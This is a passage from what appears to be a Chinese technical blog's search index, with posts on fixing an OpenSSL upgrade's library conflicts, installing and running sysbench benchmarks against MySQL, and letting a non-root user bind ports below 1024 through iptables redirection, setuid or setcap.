<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@user-virtual-machine:~# locate  libcrypto.s</span></pre></td></tr><tr><td class="code"><pre><span class="line">/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/usr/local/openssl-1.0.2h/lib/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/usr/local/openssl-1.0.2h/lib/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/48731f0a6276cfb5d94a8f18690d56f88a586e701f1dd7f56889f26be990277d/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/651c0c22a557f2bb2ac346fab05e15df10f5ffde66c44c1c2fc3aa17850744a8/usr/lib/x86_64-linux-gnu/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/83e4dde6b9cfddf46b75a07ec8d65ad87a748b98cf27de7d5b3298c1f3455ae4/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/4f4125739168e5324a507778735f107aca12cea87c92fa63557592631c272f79/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/4f4125739168e5324a507778735f107aca12cea87c92fa63557592631c272f79/usr/lib/x86_64-linux-gnu/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/77cad9873440852548dd92b5757290603941be92ca871d6a90280cb13b6e6c7e/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/c07784415822e936b897fbff950e8d436d692224675710032487f8c17fae9a41/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/de60c0e2b4379a6ab58e7ec8863a075a52b9c79f54e08f0cd7f63fa6682e4c49/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr></table></figure>
<p>移除</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /lib/x86_64-linux-gnu/libcrypto.so.1.0.0 /tmp/test/</span></pre></td></tr></table></figure>
<p>更新一下数据库<code>updatedb</code>再次查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@user-virtual-machine:~# locate  libcrypto.s</span></pre></td></tr><tr><td class="code"><pre><span class="line">/usr/local/openssl-1.0.2h/lib/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/usr/local/openssl-1.0.2h/lib/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/48731f0a6276cfb5d94a8f18690d56f88a586e701f1dd7f56889f26be990277d/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/651c0c22a557f2bb2ac346fab05e15df10f5ffde66c44c1c2fc3aa17850744a8/usr/lib/x86_64-linux-gnu/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/diff/83e4dde6b9cfddf46b75a07ec8d65ad87a748b98cf27de7d5b3298c1f3455ae4/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/4f4125739168e5324a507778735f107aca12cea87c92fa63557592631c272f79/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/4f4125739168e5324a507778735f107aca12cea87c92fa63557592631c272f79/usr/lib/x86_64-linux-gnu/libcrypto.so</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/77cad9873440852548dd92b5757290603941be92ca871d6a90280cb13b6e6c7e/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/c07784415822e936b897fbff950e8d436d692224675710032487f8c17fae9a41/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">/var/lib/docker/aufs/mnt/de60c0e2b4379a6ab58e7ec8863a075a52b9c79f54e08f0cd7f63fa6682e4c49/lib/x86_64-linux-gnu/libcrypto.so.1.0.0</span></pre></td></tr></table></figure>
<p>编译安装即可</p>
<p>实在不行还可以设置LD_LIBRARY_PATH</p>
<p>解决方案</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;ssl&#x2F;lib</span></pre></td></tr></table></figure>
<p>但是需要把这个加入环境变量</p>
<h2 id="ldconfig-xx-so-15-is-not-a-symbolic-link"><a href="#ldconfig-xx-so-15-is-not-a-symbolic-link" class="headerlink" title="ldconfig: xx.so.15 is not a symbolic link"></a>ldconfig: xx.so.15 is not a symbolic link</h2><p>mv xx.so.15 xx.so.15.b</p>
<p>ln -s  xx.so.15.b  xx.so.15</p>
<h3 id="bad-register-name"><a href="#bad-register-name" class="headerlink" title="bad register name"></a>bad register name</h3><p>/tmp/ccOI6RR5.s:1448: Error: bad register name <code>%rbp&#39;
/tmp/ccOI6RR5.s:1451: Error: bad register name</code>%rsp’<br>/tmp/ccOI6RR5.s:1452: Error: bad register name <code>%rbx&#39;
/tmp/ccOI6RR5.s:1453: Error: bad register name</code>%rbp’<br>/tmp/ccOI6RR5.s:1454: Error: bad register name <code>%r12&#39;
/tmp/ccOI6RR5.s:1455: Error: bad register name</code>%r13’</p>
<p>gcc版本bug</p>
<p>在configure \$CC 全局替换成 \$CC -m 64 编译即可</p>
<p>需要编译的时候加入-m64</p>
]]></content>
      <tags>
        <tag>openssl update</tag>
      </tags>
  </entry>
  <entry>
    <title>sysbench压测工具的安装和使用</title>
    <url>/2019/01/sysbench%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>sysbench是一款开源的多线程性能测试工具，可以执行CPU/内存/线程/IO/数据库等方面的性能测试。<br>数据库目前支持MySQL/Oracle/PostgreSQL。具体的一些参数设置，需要根据不同的测试要求来进行调整</p>
<p>系统使用CenOS7-1604-mini<br>一、安装需求环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum group install &#39;development tools&#39; -y</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum install mysql-devel git vim -y</span></pre></td></tr></table></figure>
<p>二、下载sysbench</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F; &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;akopytov&#x2F;sysbench.git</span></pre></td></tr><tr><td class="code"><pre><span class="line">cd sysbench*</span></pre></td></tr></table></figure>
<p>3.安装<br>如果MySQL不是默认路径可以手工指定</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure --with-mysql-includes&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;include --with-mysql-libs&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;lib</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp&#x2F;sysbench*</span></pre></td></tr><tr><td class="code"><pre><span class="line">.&#x2F;autogen.sh</span></pre></td></tr><tr><td class="code"><pre><span class="line">.&#x2F;configure</span></pre></td></tr><tr><td class="code"><pre><span class="line">make</span></pre></td></tr><tr><td class="code"><pre><span class="line">make install</span></pre></td></tr></table></figure>
<p>三、测试<br>1.cpu性能测试<br>sysbench –test=cpu –cpu-max-prime=20000 run<br>cpu测试主要是进行素数的加法运算，在上面的例子中，指定了最大的素数为 20000，自己可以根据机器cpu的性能来适当调整数值。<br>2.线程测试<br>sysbench –test=threads –num-threads=64 –thread-yields=100 –thread-locks=2 run<br>3.磁盘IO性能测试<br>sysbench  –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw prepare<br>sysbench –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw run<br>sysbench –test=fileio –num-threads=16 –file-total-size=3G –file-test-mode=rndrw cleanup<br>4.内存测试</p>
<p>sysbench –test=memory –memory-block-size=8k –memory-total-size=8G run<br>上述参数指定了本次测试整个过程是在内存中传输 8G 的数据量，每个 block 大小为 8K。<br>5.OLTP测试<br>需要事先创建数据库如果不指定默认是sbtest</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database sbtest character set utf8 collate utf8_general_ci</span></pre></td></tr></table></figure>
<p>先创建表和填充测试数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysbench   --db-driver&#x3D;mysql  --test&#x3D;oltp.lua --mysql-table-engine&#x3D;myisam --oltp-table-size&#x3D;1000000 \</span></pre></td></tr><tr><td class="code"><pre><span class="line">--mysql-socket&#x3D;&#x2F;tmp&#x2F;mysql.sock --mysql-user&#x3D;test --mysql-host&#x3D;localhost \</span></pre></td></tr><tr><td class="code"><pre><span class="line">--mysql-password&#x3D;test prepare</span></pre></td></tr></table></figure></p>
<p>上述参数指定了本次测试的表存储引擎类型为 myisam，这里需要注意的是，官方网站上的参数有一处有误，即 –mysql-table-engine，官方网站上写的是 –mysql-table-type，这个应该是没有及时更新导致的。另外，指定了表最大记录数为 1000000，其他参数就很好理解了，主要是指定登录方式。测试 OLTP 时，可以自己先创建数据库 sbtest，或者自己用参数 –mysql-db 来指定其他数据库。–mysql-table-engine 还可以指定为 innodb 等 MySQL 支持的表存储引擎类型   </p>
<p>进行测试<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysbench --db-driver&#x3D;mysql --mysql-host&#x3D;1.2.3.4. --mysql-port&#x3D;3306 --mysql-user&#x3D;tpcc \</span></pre></td></tr><tr><td class="code"><pre><span class="line">--mysql-password&#x3D;tpcc --test&#x3D;tests&#x2F;db&#x2F;oltp.lua --oltp_tables_count&#x3D;10 \</span></pre></td></tr><tr><td class="code"><pre><span class="line">--oltp-table-size&#x3D;10000000 --num-threads&#x3D;8 --oltp-read-only&#x3D;off   \</span></pre></td></tr><tr><td class="code"><pre><span class="line">--report-interval&#x3D;10 --rand-type&#x3D;uniform --max-time&#x3D;3600 \</span></pre></td></tr><tr><td class="code"><pre><span class="line"> --max-requests&#x3D;0 --percentile&#x3D;99 run</span></pre></td></tr></table></figure><br>[prepare|run|cleanup]<br>几个选项稍微解释下<br>–test=tests/db/oltp.lua 表示调用 tests/db/oltp.lua 脚本进行 oltp 模式测试<br>–oltp_tables_count=10 表示会生成 10 个测试表<br>–oltp-table-size=1000000 表示每个测试表填充数据量为 1000000<br>–rand-init=on 表示每个测试表都是用随机数据来填充的<br>–num-threads=8 表示发起 8个并发连接<br>–oltp-read-only=off 表示不要进行只读测试，也就是会采用读写混合模式测试<br>–report-interval=10 表示每10秒输出一次测试进度报告<br>–rand-type=uniform 表示随机类型为固定模式，其他几个可选随机模式：uniform,gaussian,special,pareto<br>–max-time=120 表示最大执行时长为 120秒<br>–max-requests=0 表示总请求数为 0，因为上面已经定义了总执行时长，所以总请求数可以设定为 0；也可以只设定总请求数，不设定最大执行时长<br>–percentile=99 表示设定采样比例，默认是 95%，即丢弃1%的长请求，在剩余的99%里取最大值<br>即：模拟 对10个表并发OLTP测试，每个表1000万行记录，持续压测时间为 1小时。<br>真实测试场景中，建议持续压测时长不小于30分钟，否则测试数据可能不具参考意义。<br>注意：oltp.lua不是一个参数而是一个文件，在源码目录test/include/oltp/里面你可以指定路径也可以切换到此目录执行，sysbench的测试只是基准测试，并不能代表实际企业环境下的性能指标真实测试场景中，数据表建议不低于10个，单表数据量不低于500万行，当然了，要视服务器硬件配置而定。如果是配备了SSD或者PCIE SSD这种高IOPS设备的话，则建议单表数据量最少不低于1亿行。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>MySQL</tag>
        <tag>sysbench</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 普通用户使用 1024 以下的端口</title>
    <url>/2019/01/Linux%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A81024%E4%BB%A5%E4%B8%8B%E7%9A%84%E7%AB%AF%E5%8F%A3/</url>
    <content><![CDATA[<p>linux对于非root权限用户不能使用1024以下的端口，对于一些服务，过高的权限，会带来一定的风险。那么对于低权限的用户如何对外开放1024以下的端口。我这里找到几种办法并且亲测可行<br>首先搭建环境centos7  账户tengine没有sudo 权限</p>
<p>##1.nginx 等软件做反向代理<br>反向代理不说了。网上以查到</p>
<p>##2.iptables端口转发<br>首先程序绑定1024以上的端口，然后root权限下做转发注意有些系统需要手动开启IP FORWARD功能 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;sysctl.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">#修改</span></pre></td></tr><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward &#x3D; 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">#重新加载</span></pre></td></tr><tr><td class="code"><pre><span class="line">sysctl -p &#x2F;etc&#x2F;sysctl.conf</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A PREROUTING -t nat -p tcp --dport 80 -j REDIRECT --to-port 8080</span></pre></td></tr></table></figure>
<p>##3. setuid<br>root账户下执行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown root:root nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">chmod 4755 nginx</span></pre></td></tr></table></figure></p>
<p>从图片可以看出来nginx可以运行，但是主进程仍然是以root权限运行,这样并不安全。</p>
<p>##4.CAP_NET_BIND_SERVICE<br>从 2.1 版本开始，Linux 内核有了能力的概念，这使得普通用户也能够做只有超级用户才能完成的工作，这包括使用端口，但是要求<strong>文件不能是脚本</strong>。</p>
<p>获取CAP_NET_BIND_SERVICE能力，即使服务程序运行在非root帐户下，也能够banding到低端口。使用的方法：<br>root账户下执行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setcap cap_net_bind_service&#x3D;+eip &#x2F;home&#x2F;tengine&#x2F;nginx&#x2F;tengine&#x2F;sbin&#x2F;nginx</span></pre></td></tr></table></figure><br>切换到tengine账户下<br>信息如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos7 sbin]# setcap cap_net_bind_service&#x3D;+eip &#x2F;home&#x2F;tengine&#x2F;nginx&#x2F;tengine&#x2F;sbin&#x2F;nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@centos7 sbin]# su tengine</span></pre></td></tr><tr><td class="code"><pre><span class="line">[tengine@centos7 sbin]$ stat nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">  文件：&quot;nginx&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  大小：6054330         块：11832      IO 块：4096   普通文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">设备：fd00h&#x2F;64768d      Inode：397136      硬链接：1</span></pre></td></tr><tr><td class="code"><pre><span class="line">权限：(0755&#x2F;-rwxr-xr-x)  Uid：( 1001&#x2F; tengine)   Gid：( 1001&#x2F; tengine)</span></pre></td></tr><tr><td class="code"><pre><span class="line">最近访问：2016-10-11 18:43:05.402239835 +0800</span></pre></td></tr><tr><td class="code"><pre><span class="line">最近更改：2016-10-11 18:25:47.273183401 +0800</span></pre></td></tr><tr><td class="code"><pre><span class="line">最近改动：2016-10-11 18:48:23.084257104 +0800</span></pre></td></tr><tr><td class="code"><pre><span class="line">创建时间：-</span></pre></td></tr><tr><td class="code"><pre><span class="line">[tengine@centos7 sbin]$ .&#x2F;nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">[tengine@centos7 sbin]$ ps -aux| grep nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">tengine  18014  0.0  0.1  45500  1124 ?        Ss   18:49   0:00 nginx: master process .&#x2F;nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">tengine  18015  0.0  0.1  45960  1596 ?        S    18:49   0:00 nginx: worker process</span></pre></td></tr><tr><td class="code"><pre><span class="line">tengine  18017  0.0  0.0 112664   984 pts&#x2F;0    R+   18:49   0:00 grep --color&#x3D;auto nginx</span></pre></td></tr><tr><td class="code"><pre><span class="line">[tengine@centos7 sbin]$</span></pre></td></tr></table></figure></p>
<p>最后别忘记怎么清除这个能力</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setcap -r nginx</span></pre></td></tr></table></figure>
<p>#authbind<br>暂时省略</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
      </tags>
  </entry>
</search>
